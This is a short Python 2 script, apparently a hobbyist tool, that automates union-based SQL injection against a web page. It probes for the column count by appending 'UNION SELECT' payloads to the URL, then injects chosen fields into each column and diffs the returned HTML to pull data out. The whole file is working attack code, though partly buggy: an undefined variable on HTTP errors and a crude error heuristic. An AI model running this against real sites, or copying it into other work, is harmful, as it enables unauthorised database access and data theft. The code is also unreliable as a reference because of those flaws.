#!/usr/bin/python
"""
Used for basic union-based SQL injection.

"""
    
import os, sys, urllib2
import json
    
class injection:
    
    def __init__(self, flags):
        self.flags = [] 

    # Grab page with urllib and split on whitespace.
    # Throws HTTPError.
    # Returns list representing page.
    def get_page(self, page):
        if 'http://' not in page:
            page = 'http://' + page
    
        # Try to get HTML, read if successful
        try:
            message = urllib2.urlopen(page)
        except urllib2.HTTPError as e:
            print e
    
        return message.read().split()
    
    # Diff two html lists by turning into sets and taking difference.
    # First param should be before injection, 2nd param after.
    # Returns list representing difference between the two pages.
    def html_diff(self, before_injection, after_injection):
        diff = list(set(after_injection) - set(before_injection))
        return diff
    
    # Try unions until no SQL errors returned.
    # Return number of columns in exposed table.
    def get_num_columns(self, page):
        count = 1
    
        original_page = self.get_page(page)
        union = page + '%20UNION%20SELECT%201'
    
        # Heuristic just looks for SELECT, needs to be MORE NUANCED!
        while 'SELECT' in self.html_diff(original_page, self.get_page(union)):
            count += 1
            union += ',%20' + str(count)
    
        return count
    
    
    # Takes page to fuzz for injections and params to check for.
    # Returns dict of lists, keys are injected strings, values are results.
    def injection(self, page, params):
        columns = self.get_num_columns(page)
        page1 = self.get_page(page)
        data = {}
    
        union_urls = ['%20' + str(i) for i in xrange(1, columns) ]
        for param in params:
            data[param] = []
            for i in xrange(0, len(union_urls) + 1):
                new_url = page + '%20UNION%20SELECT' + ",".join(union_urls[:i] + ['%20' + param] + union_urls[i:])
                #print new_url
                data[param].append(self.html_diff(page1, self.get_page(new_url)))
    
        return data
    
    #
